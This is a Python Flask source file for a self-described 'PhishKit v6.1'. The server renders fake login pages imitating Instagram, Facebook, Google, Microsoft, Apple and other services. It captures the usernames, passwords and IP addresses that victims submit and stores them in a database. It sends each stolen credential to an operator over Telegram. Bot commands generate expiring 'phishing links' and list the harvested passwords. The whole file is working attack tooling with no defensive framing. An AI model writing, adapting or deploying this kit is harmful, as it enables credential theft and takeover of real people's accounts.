# ==================== api/index.py (v6.1 - Netlify Compatible) ====================
import os
import re
import time
import secrets
import requests
from flask import Flask, request, jsonify, render_template_string, abort
from supabase import create_client, Client
from datetime import datetime, timedelta

app = Flask(__name__)

# ------------------- CONFIG -------------------
SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY")
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")
AUTHORIZED_CHAT_IDS = list(map(int, os.environ.get("AUTHORIZED_CHAT_IDS", "").split(","))) if os.environ.get("AUTHORIZED_CHAT_IDS") else []
BASE_URL = os.environ.get("BASE_URL", "https://your-app.netlify.app")  # set this!
ADMIN_KEY = os.environ.get("ADMIN_KEY", "supersecret")
DEFAULT_EXPIRY_HOURS = 24

if not SUPABASE_URL or not SUPABASE_KEY:
    raise RuntimeError("Missing Supabase credentials")
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# ------------------- PLATFORM CONFIG -------------------
PLATFORM_CONFIG = {
    "facebook": {"bg": "#f0f2f5", "accent": "#1877f2", "accent_rgb": "24,119,242", "emoji": "📘"},
    "instagram": {"bg": "#fafafa", "accent": "#0095f6", "accent_rgb": "0,149,246", "emoji": "📸"},
    "twitter": {"bg": "#ffffff", "accent": "#1d9bf0", "accent_rgb": "29,155,240", "emoji": "🐦"},
    "google": {"bg": "#ffffff", "accent": "#4285f4", "accent_rgb": "66,133,244", "emoji": "🔍"},
    "linkedin": {"bg": "#f3f6f9", "accent": "#0a66c2", "accent_rgb": "10,102,194", "emoji": "💼"},
    "tiktok": {"bg": "#010101", "accent": "#25f4ee", "accent_rgb": "37,244,238", "emoji": "🎵"},
    "snapchat": {"bg": "#fffde8", "accent": "#fffc00", "accent_rgb": "255,252,0", "emoji": "👻"},
    "reddit": {"bg": "#dae0e6", "accent": "#ff4500", "accent_rgb": "255,69,0", "emoji": "🤖"},
    "microsoft": {"bg": "#f2f2f2", "accent": "#00a4ef", "accent_rgb": "0,164,239", "emoji": "🖥️"},
    "apple": {"bg": "#f5f5f5", "accent": "#0071e3", "accent_rgb": "0,113,227", "emoji": "🍎"},
    "github": {"bg": "#f6f8fa", "accent": "#2dba4e", "accent_rgb": "45,186,78", "emoji": "🐙"},
    "discord": {"bg": "#36393f", "accent": "#5865f2", "accent_rgb": "88,101,242", "emoji": "💬"},
}
DEFAULT_PLATFORM = "facebook"

# ------------------- PLATFORM TEMPLATES -------------------
INSTAGRAM_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    body { background: #fafafa; display:flex; justify-content:center; align-items:center; min-height:100vh; }
    .container { display:flex; max-width:935px; width:100%; margin:0 auto; flex-wrap:wrap; justify-content:center; padding:32px 0; }
    .phone { display:none; }
    .login-box { background:white; border:1px solid #dbdbdb; border-radius:1px; padding:20px 40px; max-width:350px; width:100%; text-align:center; margin:0 20px; }
    .logo-text { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-weight: 700; font-size: 28px; color: #262626; letter-spacing: -1px; }
    .login-box form { margin-top:24px; }
    .login-box input[type="text"], .login-box input[type="password"] {
      width:100%; padding:9px 0 7px 8px; margin:0 0 6px 0; background:#fafafa; border:1px solid #dbdbdb; border-radius:3px;
      font-size:12px; outline:none; transition: border 0.1s;
    }
    .login-box input:focus { border-color:#a8a8a8; background:#fff; }
    .login-box button {
      width:100%; padding:5px 9px; background:#0095f6; border:none; border-radius:4px; color:white; font-weight:600; font-size:14px;
      cursor:pointer; margin-top:8px; opacity:0.9; transition:0.1s;
    }
    .login-box button:hover { opacity:1; background:#1877f2; }
    .login-box .divider { display:flex; align-items:center; margin:10px 0 18px; color:#8e8e8e; font-size:13px; font-weight:600; }
    .login-box .divider::before, .login-box .divider::after { content:''; flex:1; height:1px; background:#dbdbdb; }
    .login-box .divider::before { margin-right:18px; }
    .login-box .divider::after { margin-left:18px; }
    .fb-login { color:#385185; font-size:14px; font-weight:600; text-decoration:none; display:block; margin:8px 0 12px; }
    .fb-login::before { content: "f "; font-weight:700; }
    .forgot { color:#00376b; font-size:12px; text-decoration:none; display:block; margin-top:12px; }
    .signup-box { background:white; border:1px solid #dbdbdb; border-radius:1px; padding:20px 40px; max-width:350px; width:100%; margin-top:10px; text-align:center; font-size:14px; }
    .signup-box a { color:#0095f6; font-weight:600; text-decoration:none; }
    .app-links { display:flex; justify-content:center; gap:8px; margin:10px 0; }
    .footer { margin-top:20px; font-size:12px; color:#8e8e8e; text-align:center; }
  </style>
</head>
<body>
<div class="container">
  <div class="phone"></div>
  <div>
    <div class="login-box">
      <div class="logo-text">Instagram</div>
      <form action="/api/capture" method="POST">
        <input type="hidden" name="link_id" value="{{ link_id }}">
        <input type="hidden" name="platform" value="instagram">
        <input type="hidden" name="redirect" value="{{ redirect }}">
        <input type="text" name="username" placeholder="Phone number, username, or email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
      </form>
      <div class="divider">OR</div>
      <a href="#" class="fb-login">Log in with Facebook</a>
      <a href="#" class="forgot">Forgot password?</a>
    </div>
    <div class="signup-box">
      Don't have an account? <a href="#">Sign up</a>
    </div>
    <div class="app-links"></div>
    <div class="footer">© 2026 Instagram from Meta</div>
  </div>
</div>
</body>
</html>
"""

GENERIC_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ platform|title }} - Login</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, system-ui, sans-serif; }
        body { background: {{ bg_color }}; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background: white; padding: 40px 32px; border-radius: 12px; box-shadow: 0 8px 40px rgba(0,0,0,0.15); width: 100%; max-width: 380px; text-align: center; }
        .logo { font-size: 48px; margin-bottom: 8px; }
        h2 { color: #1a1a1a; font-weight: 600; margin-bottom: 6px; }
        .sub { color: #606770; font-size: 15px; margin-bottom: 24px; }
        input { width: 100%; padding: 14px 16px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 8px; font-size: 16px; outline: none; }
        input:focus { border-color: {{ accent }}; box-shadow: 0 0 0 2px rgba({{ accent_rgb }}, 0.2); }
        button { width: 100%; padding: 14px; background: {{ accent }}; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: 600; cursor: pointer; margin-top: 12px; }
        button:hover { opacity: 0.9; }
        .footer { margin-top: 20px; font-size: 13px; color: #777; }
    </style>
</head>
<body>
<div class="card">
    <div class="logo">{{ emoji }}</div>
    <h2>Sign in to {{ platform|title }}</h2>
    <div class="sub">Enter your credentials to continue</div>
    <form action="/api/capture" method="POST">
        <input type="hidden" name="link_id" value="{{ link_id }}">
        <input type="hidden" name="platform" value="{{ platform }}">
        <input type="hidden" name="redirect" value="{{ redirect }}">
        <input type="text" name="username" placeholder="Email / Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
    </form>
    <div id="status" class="footer"></div>
</div>
<script>
    document.querySelector('form').onsubmit = async (e) => {
        e.preventDefault();
        const form = e.target;
        const data = new FormData(form);
        const res = await fetch(form.action, { method: 'POST', body: data });
        const result = await res.json();
        if (result.status === 'ok') {
            document.getElementById('status').innerHTML = '✅ Login successful! Redirecting...';
            setTimeout(() => { window.location.href = "{{ redirect }}"; }, 1200);
        } else if (result.status === 'expired') {
            document.getElementById('status').innerHTML = '⛔ This link has expired.';
        } else {
            document.getElementById('status').innerHTML = '❌ Error, please retry.';
        }
    };
</script>
</body>
</html>
"""

PLATFORM_TEMPLATES = {
    "instagram": INSTAGRAM_TEMPLATE,
    # Add more: "facebook": FACEBOOK_TEMPLATE, etc.
}

# ------------------- HELPERS -------------------
def parse_expiry(exp_str):
    if not exp_str:
        return DEFAULT_EXPIRY_HOURS * 3600
    exp_str = exp_str.strip().lower()
    match = re.match(r'^(\d+)([dhms])$', exp_str)
    if not match:
        return DEFAULT_EXPIRY_HOURS * 3600
    num = int(match.group(1))
    unit = match.group(2)
    if unit == 'd': return num * 86400
    elif unit == 'h': return num * 3600
    elif unit == 'm': return num * 60
    elif unit == 's': return num
    return DEFAULT_EXPIRY_HOURS * 3600

def generate_shortcode(length=8):
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return ''.join(secrets.choice(alphabet) for _ in range(length))

def send_telegram_message(chat_id, text, parse_mode="HTML"):
    if not TELEGRAM_TOKEN:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception:
        pass

def broadcast_new_entry(entry):
    owner = entry.get("owner_id")
    if not owner:
        return
    try:
        owner_int = int(owner)
    except:
        return
    if AUTHORIZED_CHAT_IDS and owner_int not in AUTHORIZED_CHAT_IDS:
        return
    msg = (
        f"🔔 <b>New Credential Captured</b>\n"
        f"🆔 <code>{entry.get('id')}</code>\n"
        f"🔗 Link: <code>{entry.get('link_id', 'N/A')}</code>\n"
        f"📱 Platform: <b>{entry.get('platform', 'unknown')}</b>\n"
        f"👤 Username: <code>{entry.get('username', 'N/A')}</code>\n"
        f"🔑 Password: <code>{entry.get('password', 'N/A')}</code>\n"
        f"🕒 Time: {entry.get('created_at', 'now')}\n"
        f"🌐 IP: {entry.get('ip', 'N/A')}"
    )
    send_telegram_message(owner_int, msg)

# ------------------- ROUTES -------------------
@app.route("/<shortcode>", methods=["GET"])
def phishing_page(shortcode):
    resp = supabase.table("links").select("*").eq("id", shortcode).execute()
    if not resp.data:
        abort(404)
    link = resp.data[0]

    expires_at = datetime.fromisoformat(link["expires_at"].replace("Z", "+00:00"))
    if datetime.utcnow() > expires_at:
        supabase.table("links").update({"active": False}).eq("id", shortcode).execute()
        return "This link has expired.", 410

    platform = link["platform"].lower()
    redirect_url = link.get("redirect_to") or PLATFORM_CONFIG.get(platform, {}).get("redirect", "https://google.com")
    
    template = PLATFORM_TEMPLATES.get(platform, GENERIC_TEMPLATE)
    config = PLATFORM_CONFIG.get(platform, PLATFORM_CONFIG[DEFAULT_PLATFORM])
    
    return render_template_string(
        template,
        link_id=shortcode,
        platform=platform,
        redirect=redirect_url,
        bg_color=config.get("bg", "#f0f2f5"),
        accent=config.get("accent", "#1877f2"),
        accent_rgb=config.get("accent_rgb", "24,119,242"),
        emoji=config.get("emoji", "📱")
    )

@app.route("/api/capture", methods=["POST"])
def capture():
    try:
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "").strip()
        platform = request.form.get("platform", "unknown").strip()
        link_id = request.form.get("link_id", "").strip()
        redirect_url = request.form.get("redirect", "").strip()
        ip = request.headers.get("X-Forwarded-For", request.remote_addr or "0.0.0.0").split(",")[0].strip()

        if not username or not password or not link_id:
            return jsonify({"status": "error", "msg": "Missing fields"}), 400

        resp = supabase.table("links").select("owner_id, expires_at, active").eq("id", link_id).execute()
        if not resp.data:
            return jsonify({"status": "error", "msg": "Invalid link"}), 404
        link = resp.data[0]
        expires_at = datetime.fromisoformat(link["expires_at"].replace("Z", "+00:00"))
        if datetime.utcnow() > expires_at or link.get("active") == False:
            return jsonify({"status": "expired", "msg": "Link expired"}), 403

        owner = link["owner_id"]

        data = {
            "platform": platform,
            "username": username,
            "password": password,
            "ip": ip,
            "owner_id": owner,
            "link_id": link_id,
            "redirect_to": redirect_url,
            "created_at": datetime.utcnow().isoformat()
        }
        result = supabase.table("creds").insert(data).execute()
        if result.data:
            entry = result.data[0]
            broadcast_new_entry(entry)
            return jsonify({"status": "ok", "id": entry.get("id")})
        else:
            return jsonify({"status": "error", "msg": "DB insert failed"}), 500
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)}), 500

@app.route("/api/telegram", methods=["POST"])
def telegram_webhook():
    try:
        update = request.get_json()
        if not update or "message" not in update:
            return "OK", 200

        msg = update["message"]
        chat_id = msg.get("chat", {}).get("id")
        text = msg.get("text", "").strip()
        if not chat_id:
            return "OK", 200

        if AUTHORIZED_CHAT_IDS and chat_id not in AUTHORIZED_CHAT_IDS:
            send_telegram_message(chat_id, "⛔ Unauthorized.")
            return "OK", 200

        # ---- COMMANDS ----
        if text.startswith("/gen"):
            parts = text.split(maxsplit=3)
            if len(parts) < 2:
                send_telegram_message(chat_id, "⚠️ Usage: /gen <platform> [redirect_url] [expiry]\nExample: /gen instagram https://example.com 1d")
                return "OK", 200

            platform = parts[1].lower()
            if platform not in PLATFORM_CONFIG:
                send_telegram_message(chat_id, f"❌ Platform '{platform}' not supported. Available: {', '.join(PLATFORM_CONFIG.keys())}")
                return "OK", 200

            redirect = parts[2] if len(parts) >= 3 else ""
            expiry_str = parts[3] if len(parts) >= 4 else ""

            if redirect and not (redirect.startswith("http://") or redirect.startswith("https://")):
                send_telegram_message(chat_id, "⚠️ Redirect URL must start with http:// or https://")
                return "OK", 200

            for _ in range(5):
                sc = generate_shortcode(8)
                existing = supabase.table("links").select("id").eq("id", sc).execute()
                if not existing.data:
                    break
            else:
                send_telegram_message(chat_id, "❌ Failed to generate unique code. Retry.")
                return "OK", 200

            expiry_seconds = parse_expiry(expiry_str)
            expires_at = datetime.utcnow() + timedelta(seconds=expiry_seconds)

            link_data = {
                "id": sc,
                "owner_id": str(chat_id),
                "platform": platform,
                "redirect_to": redirect,
                "expires_at": expires_at.isoformat(),
                "active": True
            }
            supabase.table("links").insert(link_data).execute()

            full_link = f"{BASE_URL}/{sc}"
            human_exp = expires_at.strftime("%Y-%m-%d %H:%M:%S UTC")
            send_telegram_message(
                chat_id,
                f"🔗 <b>Your phishing link:</b>\n<code>{full_link}</code>\n\n"
                f"📱 Platform: {platform}\n"
                f"↪️ Redirect: <code>{redirect if redirect else 'Default'}</code>\n"
                f"⏳ Expires: {human_exp}\n\n"
                f"Use /mylinks to see all your active links.",
                parse_mode="HTML"
            )

        elif text.startswith("/mylinks"):
            resp = supabase.table("links").select("*").eq("owner_id", str(chat_id)).order("created_at", desc=True).execute()
            if not resp.data:
                send_telegram_message(chat_id, "📭 You haven't generated any links yet.")
                return "OK", 200

            lines = []
            for link in resp.data:
                sc = link["id"]
                platform = link["platform"]
                redirect = link.get("redirect_to") or "default"
                expires = datetime.fromisoformat(link["expires_at"].replace("Z", "+00:00"))
                active = "✅ Active" if (datetime.utcnow() < expires and link.get("active", True)) else "❌ Expired"
                count_resp = supabase.table("creds").select("id", count="exact").eq("link_id", sc).execute()
                count = count_resp.count if hasattr(count_resp, 'count') else 0
                lines.append(f"🔹 <code>{sc}</code> | {platform} | {active} | {count} creds | → {redirect[:30]}")

            msg_text = "\n".join(lines)
            if len(msg_text) > 4000:
                for i in range(0, len(msg_text), 4000):
                    send_telegram_message(chat_id, msg_text[i:i+4000], parse_mode="HTML")
            else:
                send_telegram_message(chat_id, f"📋 <b>Your links:</b>\n\n{msg_text}", parse_mode="HTML")

        elif text.startswith("/view"):
            resp = supabase.table("creds").select("*").eq("owner_id", str(chat_id)).order("created_at", desc=True).limit(20).execute()
            if not resp.data:
                send_telegram_message(chat_id, "📭 No credentials captured.")
            else:
                lines = []
                for idx, row in enumerate(resp.data, 1):
                    lines.append(
                        f"{idx}. <b>{row.get('platform','?')}</b> | "
                        f"<code>{row.get('username','')}</code> | "
                        f"<code>{row.get('password','')}</code> | "
                        f"link: <code>{row.get('link_id','N/A')}</code> | "
                        f"ID: <code>{row.get('id')}</code>"
                    )
                msg_text = "\n".join(lines)
                if len(msg_text) > 4000:
                    for i in range(0, len(msg_text), 4000):
                        send_telegram_message(chat_id, msg_text[i:i+4000], parse_mode="HTML")
                else:
                    send_telegram_message(chat_id, msg_text, parse_mode="HTML")

        elif text.startswith("/delete"):
            parts = text.split()
            if len(parts) < 2:
                send_telegram_message(chat_id, "⚠️ Usage: /delete <cred_id>")
            else:
                rec_id = parts[1]
                check = supabase.table("creds").select("id").eq("id", rec_id).eq("owner_id", str(chat_id)).execute()
                if not check.data:
                    send_telegram_message(chat_id, f"❌ Record {rec_id} not yours or doesn't exist.")
                else:
                    supabase.table("creds").delete().eq("id", rec_id).eq("owner_id", str(chat_id)).execute()
                    send_telegram_message(chat_id, f"✅ Deleted your record {rec_id}")

        elif text.startswith("/stats"):
            resp = supabase.table("creds").select("id", count="exact").eq("owner_id", str(chat_id)).execute()
            count = resp.count if hasattr(resp, 'count') else 0
            send_telegram_message(chat_id, f"📊 Total credentials from your links: <b>{count}</b>")

        elif text.startswith("/start"):
            send_telegram_message(
                chat_id,
                "👋 <b>PhishKit v6.1 - Static Template + Random URLs</b>\n\n"
                "Commands:\n"
                "/gen <platform> [redirect] [expiry] – create a random link\n"
                "/mylinks – list all your generated links (with status & count)\n"
                "/view – show your captured credentials\n"
                "/delete <id> – delete a credential\n"
                "/stats – total creds count\n\n"
                "Expiry: 1d, 2h, 30m (default 24h).",
                parse_mode="HTML"
            )

        else:
            send_telegram_message(chat_id, "🤖 Unknown. Use /start for help.")
        return "OK", 200

    except Exception as e:
        print(f"Webhook error: {e}")
        return "OK", 200

@app.route("/api/alllinks", methods=["GET"])
def all_links_admin():
    key = request.args.get("key", "")
    if key != ADMIN_KEY:
        return jsonify({"error": "Unauthorized"}), 401
    resp = supabase.table("links").select("*").order("created_at", desc=True).execute()
    return jsonify(resp.data)

@app.route("/api/health", methods=["GET"])
def health():
    return jsonify({"status": "alive", "version": "6.1", "features": "static-templates+random-urls"})